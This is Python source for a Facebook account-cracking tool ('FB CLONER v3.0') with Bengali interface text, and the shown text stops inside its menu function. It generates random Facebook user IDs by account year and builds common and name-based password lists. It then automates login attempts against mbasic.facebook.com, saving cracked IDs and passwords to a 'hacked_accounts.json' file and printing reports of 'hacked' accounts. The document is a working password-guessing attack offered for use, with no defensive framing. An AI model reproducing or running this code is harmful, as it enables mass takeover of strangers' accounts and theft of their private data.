def banner():
    os.system("clear" if os.name == "posix" else "cls")
    banner_text = f"""
    ╔══════════════════════════════════════════════╗
    ║           {TUSHAR} FB CLONER v3.0                ║
    ║       Year & Quantity Based Clone Tool          ║
    ╚══════════════════════════════════════════════╝
    """
    console.print(f"[bold cyan]{banner_text}[/bold cyan]")
    console.print(f"[bold green]{'─'*50}[/bold green]")

def generate_fb_ids(year, quantity):
    year_ranges = {
        2004: (100000000000000, 100000000500000),
        2005: (100000000500001, 100000001000000),
        2006: (100000001000001, 100000002000000),
        2007: (100000002000001, 100000003000000),
        2008: (100000003000001, 100000005000000),
        2009: (100000005000001, 100000008000000),
        2010: (100000008000001, 100000012000000),
        2011: (100000012000001, 100000018000000),
        2012: (100000018000001, 100000025000000),
        2013: (100000025000001, 100000035000000),
        2014: (100000035000001, 100000050000000),
        2015: (100000050000001, 100000070000000),
        2016: (100000070000001, 100000100000000),
        2017: (100000100000001, 100000150000000),
        2018: (100000150000001, 100000220000000),
        2019: (100000220000001, 100000320000000),
        2020: (100000320000001, 100000450000000),
        2021: (100000450000001, 100000600000000),
        2022: (100000600000001, 100000800000000),
        2023: (100000800000001, 100001000000000),
        2024: (100001000000001, 100001200000000),
        2025: (100001200000001, 100001500000000),
    }

    if year not in year_ranges:
        base = 100000000000000 + ((year - 2004) * 50000000)
        start_id = base
        end_id = base + 50000000
    else:
        start_id, end_id = year_ranges[year]

    total_possible = end_id - start_id

    if quantity > total_possible:
        console.print(f"[yellow][!] {quantity} টি আইডি সম্ভব না, সর্বোচ্চ {total_possible} টি নেওয়া হবে[/yellow]")
        quantity = total_possible

    console.print(f"\n[cyan][i] বছর {year} এর জন্য আইডি জেনারেট হচ্ছে...[/cyan]")

    generated = set()
    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%")) as progress:
        task = progress.add_task("[cyan]আইডি জেনারেট হচ্ছে...", total=quantity)
        while len(generated) < quantity:
            fb_id = random.randint(start_id, end_id)
            generated.add(str(fb_id))
            progress.update(task, completed=len(generated))

    ids = list(generated)
    random.shuffle(ids)
    return ids

def generate_password_list():
    passwords = [
        "123456", "12345678", "123456789", "1234567890",
        "password", "password123", "password1234",
        "admin", "admin123", "admin1234",
        "bangladesh", "bangladesh123",
        "facebook", "facebook123", "fb123",
        "iloveyou", "love", "love123",
        "hello", "hello123", "hi123",
        "fuckyou", "fuck", "fuck123",
        "123", "1234", "12345", "123456",
        "111111", "000000", "666666",
        "qwerty", "qwerty123", "abc123",
        "monkey", "dragon", "master",
        "sunshine", "princess", "football",
        "trustno1", "welcome",
        "login", "pass", "pass123",
        "1q2w3e", "1q2w3e4r", "qazwsx",
        "121212", "131313", "654321",
        "987654", "987654321", "147258",
        "bangla", "dhaka", "dhaka123",
        "bd123", "bangladesh1",
        "mahbub", "rafiq", "hasan",
        "rahman", "khan", "islam",
        "karim", "rahim", "jamal",
        "kamal", "arif", "sagor",
        "rifat", "siam", "fahim",
    ]
    years = ["2024", "2025", "2023", "2022", "2021", "2020"]
    for y in years:
        passwords.append(y)
        for base in ["bangladesh", "facebook", "admin", "password", "dhaka", "bd"]:
            passwords.append(base + y)
    random.shuffle(passwords)
    return list(set(passwords))

COOKIE_FILE = "hacked_accounts.json"

def save_hacked_account(id, password, year):
    data = []
    if os.path.exists(COOKIE_FILE):
        try:
            with open(COOKIE_FILE, "r") as f:
                data = json.load(f)
        except:
            data = []
    for acc in data:
        if acc["id"] == id:
            return
    entry = {"id": id, "password": password, "year": year, "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
    data.append(entry)
    with open(COOKIE_FILE, "w") as f:
        json.dump(data, f, indent=4)

def show_hacked_accounts():
    if not os.path.exists(COOKIE_FILE):
        console.print("[yellow][!] এখনো কোনো একাউন্ট হ্যাক হয়নি[/yellow]")
        return
    try:
        with open(COOKIE_FILE, "r") as f:
            data = json.load(f)
    except:
        console.print("[red][!] ফাইল পড়তে সমস্যা[/red]")
        return
    if not data:
        console.print("[yellow][!] এখনো কোনো একাউন্ট হ্যাক হয়নি[/yellow]")
        return
    table = Table(title=f"{YOUR_NAME} - হ্যাক করা একাউন্ট ({len(data)})")
    table.add_column("নং", style="cyan")
    table.add_column("আইডি", style="green")
    table.add_column("পাসওয়ার্ড", style="red")
    table.add_column("বছর", style="yellow")
    table.add_column("সময়", style="white")
    for i, acc in enumerate(data, 1):
        table.add_row(str(i), acc["id"], acc["password"], str(acc["year"]), acc["time"])
    console.print(table)

def check_facebook_login(uid, password):
    br = mechanize.Browser()
    br.set_handle_robots(False)
    br.set_handle_refresh(False)
    br.addheaders = [
        ("User-Agent", random.choice(UA_LIST)),
        ("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"),
        ("Accept-Language", "en-US,en;q=0.5"),
        ("Referer", "https://mbasic.facebook.com/"),
    ]
    try:
        br.open("https://mbasic.facebook.com/login.php", timeout=10)
        br.select_form(nr=0)
        br.form["email"] = uid
        br.form["pass"] = password
        response = br.submit()
        content = response.read().decode("utf-8", errors="ignore")
        if "c_user" in content:
            return True
        elif "checkpoint" in response.geturl():
            return "checkpoint"
        else:
            return False
    except Exception:
        return False

def start_cloning(ids, passwords, year, thread_count=20):
    total_ids = len(ids)
    total_pass = len(passwords)
    console.print(f"\n[bold cyan]╔═══ ক্লোনিং শুরু ═══╗[/bold cyan]")
    console.print(f"[bold cyan]║[/bold cyan] মোট আইডি      : {total_ids}")
    console.print(f"[bold cyan]║[/bold cyan] মোট পাসওয়ার্ড : {total_pass}")
    console.print(f"[bold cyan]║[/bold cyan] বছর           : {year}")
    console.print(f"[bold cyan]╚════════════════════╝[/bold cyan]")
    hacked = 0
    checkpoint = 0
    failed = 0
    with Progress() as progress:
        task = progress.add_task("[cyan]ক্লোনিং চলছে...", total=total_ids)
        for uid in ids:
            found = False
            for pas in passwords:
                if found:
                    break
                try:
                    with ThreadPoolExecutor(max_workers=1) as executor:
                        result = executor.submit(check_facebook_login, uid, pas).result()
                    if result is True:
                        console.print(f"[bold green][✔] হ্যাকড![/bold green] ID: {uid} | Pass: {pas}")
                        save_hacked_account(uid, pas, year)
                        hacked += 1
                        found = True
                    elif result == "checkpoint":
                        console.print(f"[yellow][⚠] চেকপয়েন্ট[/yellow] ID: {uid} | Pass: {pas}")
                        save_hacked_account(uid, pas, year)
                        checkpoint += 1
                        found = True
                except:
                    continue
            if not found:
                failed += 1
            progress.update(task, advance=1)
            time.sleep(0.1)
    return hacked, checkpoint, failed

def show_report(hacked, checkpoint, failed, total_ids):
    console.print(f"\n[bold cyan]╔═══ ক্লোনিং রিপোর্ট ═══╗[/bold cyan]")
    console.print(f"[bold cyan]║[/bold cyan] মোট আইডি     : {total_ids}")
    console.print(f"[bold green]║[/bold green] সফল হ্যাক   : {hacked}")
    console.print(f"[bold yellow]║[/bold yellow] চেকপয়েন্ট  : {checkpoint}")
    console.print(f"[bold red]║[/bold red] ব্যর্থ       : {failed}")
    console.print(f"[bold cyan]╚═══════════════════════╝[/bold cyan]")
    report_file = f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(report_file, "w") as f:
        f.write(f"{YOUR_NAME} CLONER REPORT\n")
        f.write(f"{'='*40}\n")
        f.write(f"Total IDs   : {total_ids}\n")
        f.write(f"Hacked      : {hacked}\n")
        f.write(f"CheckpoNAM : {checkpoint}\n")
        f.write(f"Failed      : {failed}\n")
    console.print(f"[green][+] রিপোর্ট সেভ করা হয়েছে: {report_file}[/green]")

def show_stats():
    if not os.path.exists(COOKIE_FILE):
        console.print("[yellow][!] এখনো কোনো ডাটা নেই[/yellow]")
        return
    try:
        with open(COOKIE_FILE, "r") as f:
            data = json.load(f)
    except:
        console.print("[red][!] ডাটা লোড করতে সমস্যা[/red]")
        return
    if not data:
        console.print("[yellow][!] এখনো কোনো ডাটা নেই[/yellow]")
        return
    console.print(f"\n[bold cyan]═══ {YOUR_NAME} CLONER স্ট্যাটিস্টিক্স ═══[/bold cyan]")
    console.print(f"[white]মোট হ্যাক করা একাউন্ট: {len(data)}[/white]")
    year_count = {}
    for acc in data:
        y = acc.get("year", "Unknown")
        year_count[y] = year_count.get(y, 0) + 1
    console.print(f"\n[bold yellow]বছর ভিত্তিক হিসাব:[/bold yellow]")
    for year, count in sorted(year_count.items()):
        console.print(f"   [cyan]{year}[/cyan] : {count} টি")
    console.print(f"\n[dim]সর্বশেষ হ্যাক: {data[-1]['time']}[/dim]")

def custom_password_list():
    console.print("\n[bold yellow]পাসওয়ার্ড অপশন:[/bold yellow]")
    console.print("[1] ডিফল্ট পাসওয়ার্ড লিস্ট (১০০+)")
    console.print("[2] নিজের পাসওয়ার্ড ফাইল দিন")
    console.print("[3] শুধু নাম ভিত্তিক")
    choice = console.input("\n[yellow]অপশন দিন (1-3): [/yellow]")
    if choice == "2":
        filename = console.input("[yellow]পাসওয়ার্ড ফাইলের নাম দিন: [/yellow]")
        if os.path.exists(filename):
            with open(filename, "r") as f:
                passwords = [line.strip() for line in f if line.strip()]
            console.print(f"[green][+] {len(passwords)} টি পাসওয়ার্ড লোড করা হয়েছে[/green]")
            return passwords
        else:
            console.print("[red][!] ফাইল নেই, ডিফল্ট ব্যবহার করা হবে[/red]")
            return generate_password_list()
    elif choice == "3":
        name = console.input("[yellow]টার্গেটের নাম দিন: [/yellow]")
        passwords = []
        base = name.lower()
        for suffix in ["", "123", "123456", "@123", "786", "1", "12", "2024", "2025"]:
            passwords.append(base + suffix)
            passwords.append(base.capitalize() + suffix)
        passwords.extend(["123456", "password", "bangladesh"])
        return list(set(passwords))
    else:
        return generate_password_list()

def main():
    banner()
    while True:
        console.print(f"\n[bold green]═══ {YOUR_NAME} CLONER মেনু ═══[/bold green]")
        console.print("[1] 🎯 আইডি ক্লোন শুরু করুন")
